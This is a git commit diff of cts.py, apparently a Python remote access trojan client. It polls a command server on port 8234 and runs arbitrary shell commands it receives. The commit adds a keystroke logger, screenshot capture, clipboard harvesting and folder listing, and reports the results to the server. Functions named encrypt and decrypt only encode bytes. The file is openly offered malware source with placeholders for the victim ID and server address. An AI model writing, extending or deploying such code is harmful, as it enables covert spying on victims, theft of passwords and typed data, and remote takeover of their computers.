1d1044f1281ebdeaa2dac04dd670a27b79182ee0
Paranomic vibes <91229775+paranomicvibes@users.noreply.github.com>
2023-12-11 20:44:54 +0100

    Update cts.py

--- cts.py
+++ cts.py
@@ -3,16 +3,26 @@ import subprocess
 import os
 import platform
 import time
+import pyautogui
+import clipboard
+import keyboard
 
 # Replace these placeholders with actual values during activation
-UID = '<UID>'  # Replace with the actual UID
-SERVER_IP = '<SERVER_IP>'  # Replace with the actual server IP
+UID = '<UID>'
+SERVER_IP = '<SERVER_IP>'
+
+def encrypt_message(message):
+    return message.encode()
+
+def decrypt_message(encrypted_message):
+    return encrypted_message.decode()
 
 def send_data(data):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
             client_socket.connect((SERVER_IP, 8234))
-            client_socket.sendall(data.encode())
+            encrypted_data = encrypt_message(data)
+            client_socket.sendall(encrypted_data)
     except Exception as e:
         print(f"Error sending data: {e}")
 
@@ -20,8 +30,9 @@ def receive_data():
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
             client_socket.connect((SERVER_IP, 8234))
-            data = client_socket.recv(4096)
-            return data.decode()
+            encrypted_data = client_socket.recv(4096)
+            decrypted_data = decrypt_message(encrypted_data)
+            return decrypted_data
     except Exception as e:
         print(f"Error receiving data: {e}")
         return None
@@ -42,6 +53,31 @@ def get_system_info():
     system_info += f"Processor: {platform.processor()}\n"
     return system_info
 
+def list_folders(directory='.'):
+    folders = []
+    for folder in os.listdir(directory):
+        if os.path.isdir(os.path.join(directory, folder)):
+            folders.append(os.path.join(directory, folder))
+    return folders
+
+def take_screenshot():
+    screenshot_path = f'screenshot_{int(time.time())}.png'
+    pyautogui.screenshot(screenshot_path)
+    return screenshot_path
+
+def save_clipboard_data():
+    clipboard_data = clipboard.paste()
+    with open('clipboard_data.txt', 'a') as clipboard_file:
+        clipboard_file.write(f"{clipboard_data}\n")
+
+def log_key_strokes():
+    def on_key_event(e):
+        if e.event_type == keyboard.KEY_DOWN:
+            with open('key_log.txt', 'a') as key_log_file:
+                key_log_file.write(f"{e.name}\n")
+
+    keyboard.hook(on_key_event)
+
 def main():
     while True:
         command = receive_data()
@@ -54,6 +90,18 @@ def main():
             elif command.startswith("get_sys_info"):
                 system_info = get_system_info()
                 send_data(system_info)
+            elif command.startswith("list_folders"):
+                folders_info = list_folders()
+                send_data(f"List of folders:\n{', '.join(folders_info)}")
+            elif command.startswith("take_screenshot"):
+                screenshot_path = take_screenshot()
+                send_data(f"Screenshot saved at: {screenshot_path}")
+            elif command.startswith("save_clipboard_data"):
+                save_clipboard_data()
+                send_data("Clipboard data saved.")
+            elif command.startswith("log_key_strokes"):
+                log_key_strokes()
+                send_data("Key strokes logging started.")
             else:
                 result = execute_command(command)
                 send_data(result)
